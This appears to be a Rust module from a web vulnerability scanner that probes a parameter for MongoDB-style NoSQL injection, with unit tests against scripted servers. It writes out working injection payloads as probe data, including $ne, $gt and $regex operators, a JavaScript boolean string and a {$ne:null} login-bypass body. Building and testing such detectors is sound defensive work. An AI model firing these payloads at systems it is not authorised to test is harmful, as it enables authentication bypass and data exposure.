//! nosqli — NoSQL injection (MongoDB-style operator & auth-bypass probes).
//!
//! Port of `checks/nosqli.py`.

use crate::checks::similarity;
use crate::opts::Opts;
use crate::registry::CheckFuture;
use pentest_core::{Finding, HttpClient, HttpRequest, Severity};
use std::sync::LazyLock;

pub const NAME: &str = "nosqli";

static ERROR_MARKERS: LazyLock<regex::Regex> = LazyLock::new(|| {
    regex::Regex::new(r"(?i)MongoError|MongoServerError|CastError|BSONError|unexpected token|\$where|failed to parse").unwrap()
});

pub fn run<'a>(client: &'a HttpClient, opts: &'a Opts) -> CheckFuture<'a> {
    Box::pin(run_impl(client, opts))
}

async fn run_impl(client: &HttpClient, opts: &Opts) -> Vec<Finding> {
    let mut out = Vec::new();
    let Some(param) = &opts.param else {
        return out;
    };
    let method = opts.method.to_uppercase();
    let base = &opts.base_value;
    let control_val = if base.is_empty() {
        "1".to_string()
    } else {
        format!("{base}zzq")
    };

    if method == "GET" {
        let Ok(baseline) = client.request(HttpRequest::get().param(param, base)).await else {
            return out;
        };
        let probes: [(HttpRequest, &str); 4] = [
            (
                HttpRequest::get().param(format!("{param}[$ne]"), base),
                "operator $ne injection",
            ),
            (
                HttpRequest::get().param(format!("{param}[$gt]"), ""),
                "operator $gt injection",
            ),
            (
                HttpRequest::get().param(format!("{param}[$regex]"), ".*"),
                "operator $regex injection",
            ),
            (
                HttpRequest::get().param(param, format!("{base}' || '1'=='1")),
                "JS boolean injection",
            ),
        ];
        for (req, why) in probes {
            let Ok(r) = client.request(req).await else {
                continue;
            };
            if let Some(m) = ERROR_MARKERS.find(&r.body) {
                if ERROR_MARKERS.find(&baseline.body).is_none() {
                    out.push(
                        Finding::new(NAME, Severity::High, "NoSQL injection (error-based)", why)
                            .with_evidence(m.as_str()),
                    );
                    return out;
                }
            }
            let sim = similarity(&r.body, &baseline.body);
            if sim < 0.85 && r.status < 500 {
                let Ok(c) = client
                    .request(HttpRequest::get().param(param, &control_val))
                    .await
                else {
                    continue;
                };
                let sim_control = similarity(&r.body, &c.body);
                if sim_control < 0.85 {
                    out.push(
                        Finding::new(
                            NAME,
                            Severity::High,
                            "NoSQL injection (behavior change)",
                            format!("{why} altered response; benign control value did not"),
                        )
                        .with_evidence(format!("sim={sim:.2}, control sim={sim_control:.2}")),
                    );
                    return out;
                }
            }
        }
    } else {
        let Ok(baseline) = client
            .request(HttpRequest::post().json(serde_json::json!({ param: base })))
            .await
        else {
            return out;
        };
        let probes: [(serde_json::Value, &str); 3] = [
            (
                serde_json::json!({ param: { "$ne": serde_json::Value::Null } }),
                "{$ne:null} auth-bypass",
            ),
            (
                serde_json::json!({ param: { "$gt": "" } }),
                "{$gt:''} operator",
            ),
            (
                serde_json::json!({ param: { "$regex": ".*" } }),
                "{$regex:'.*'} operator",
            ),
        ];
        for (body, why) in probes {
            let Ok(r) = client.request(HttpRequest::post().json(body)).await else {
                continue;
            };
            if let Some(m) = ERROR_MARKERS.find(&r.body) {
                if ERROR_MARKERS.find(&baseline.body).is_none() {
                    out.push(
                        Finding::new(NAME, Severity::High, "NoSQL injection (error-based)", why)
                            .with_evidence(m.as_str()),
                    );
                    return out;
                }
            }
            let sim = similarity(&r.body, &baseline.body);
            if sim < 0.85 && r.status < 500 {
                let Ok(c) = client
                    .request(
                        HttpRequest::post().json(serde_json::json!({ param: control_val.clone() })),
                    )
                    .await
                else {
                    continue;
                };
                let sim_control = similarity(&r.body, &c.body);
                if sim_control < 0.85 {
                    out.push(
                        Finding::new(
                            NAME,
                            Severity::High,
                            "NoSQL injection (behavior change)",
                            format!("{why} altered response; benign control value did not"),
                        )
                        .with_evidence(format!("sim={sim:.2}, control sim={sim_control:.2}")),
                    );
                    return out;
                }
            }
        }
    }
    out
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::checks::test_support::{scripted_server, ScriptedResponse};
    use pentest_core::HttpClientConfig;

    fn fast_client(base_url: String) -> HttpClient {
        let config = HttpClientConfig {
            delay: std::time::Duration::from_millis(0),
            ..HttpClientConfig::default()
        };
        HttpClient::new(base_url, config)
    }

    #[tokio::test]
    async fn detects_operator_injection_error_based_over_get() {
        let base = scripted_server(|req, _| {
            if req
                .query
                .keys()
                .any(|k| k.contains("$ne") || k.contains("$gt") || k.contains("$regex"))
            {
                ScriptedResponse::ok("MongoError: bad query")
            } else {
                ScriptedResponse::ok("normal")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("user".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "NoSQL injection (error-based)");
    }

    #[tokio::test]
    async fn no_error_based_finding_when_the_marker_is_in_the_baseline() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("MongoError: bad query")).await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("user".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(
            findings.is_empty(),
            "a baseline that already renders the marker must not be flagged as injection"
        );
    }

    #[tokio::test]
    async fn no_error_based_finding_when_the_marker_is_in_the_baseline_over_post_json() {
        let base = scripted_server(|_req, _| {
            ScriptedResponse::ok("MongoServerError: operator not allowed here")
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("password".to_string()),
            method: "POST".to_string(),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn detects_behavior_change_only_when_the_control_value_stays_normal() {
        let base = scripted_server(|req, _| {
            if req.query.keys().any(|k| k.contains("$regex")) {
                ScriptedResponse::ok(
                    "all users admin bob eve root guest svc listed in one response",
                )
            } else {
                ScriptedResponse::ok("single user")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("user".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "NoSQL injection (behavior change)");
        assert_eq!(findings[0].severity, Severity::High);
    }

    #[tokio::test]
    async fn detects_behavior_change_over_post_json_with_a_control_value() {
        let base = scripted_server(|req, _| {
            if req.body.contains("$regex") {
                ScriptedResponse::ok("all accounts leaked in one very long response body")
            } else {
                ScriptedResponse::ok("login failed")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("password".to_string()),
            method: "POST".to_string(),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "NoSQL injection (behavior change)");
    }

    #[tokio::test]
    async fn no_behavior_finding_when_a_benign_control_value_diverges_too() {
        let base = scripted_server(|req, _| {
            let v = req
                .query
                .iter()
                .find(|(k, _)| k.starts_with("id"))
                .map(|(_, v)| v.as_str())
                .unwrap_or("1");
            if v == "1" {
                ScriptedResponse::ok("page one")
            } else {
                ScriptedResponse::ok("other page contents, quite a bit longer than page one")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(
            findings.is_empty(),
            "an endpoint that reshapes for any value (pagination) must not be flagged"
        );
    }

    #[tokio::test]
    async fn detects_auth_bypass_over_post_json() {
        let base = scripted_server(|req, _| {
            if req.body.contains("$ne") {
                ScriptedResponse::ok("MongoServerError: operator not allowed here")
            } else {
                ScriptedResponse::ok("login failed")
            }
        })
        .await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("password".to_string()),
            method: "POST".to_string(),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert_eq!(findings.len(), 1);
        assert_eq!(findings[0].title, "NoSQL injection (error-based)");
    }

    #[tokio::test]
    async fn no_findings_against_a_clean_target() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("static, unchanging")).await;
        let client = fast_client(base);
        let opts = Opts {
            param: Some("id".to_string()),
            ..Opts::default()
        };

        let findings = run_impl(&client, &opts).await;

        assert!(findings.is_empty());
    }

    #[tokio::test]
    async fn returns_empty_without_a_param() {
        let base = scripted_server(|_req, _| ScriptedResponse::ok("ok")).await;
        let client = fast_client(base);
        let findings = run_impl(&client, &Opts::default()).await;
        assert!(findings.is_empty());
    }
}
